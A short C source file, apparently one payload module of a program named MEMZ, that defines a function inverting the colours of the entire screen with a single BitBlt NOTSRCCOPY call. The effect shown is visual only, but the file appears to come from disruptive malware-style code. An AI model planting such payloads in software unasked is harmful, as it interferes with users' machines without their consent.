#include "../MEMZ.h"

PAYLOADFUNCTIONVISUAL(payloadInvertScreen) {
	PAYLOADHEAD

	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
	
	out: return 100;
}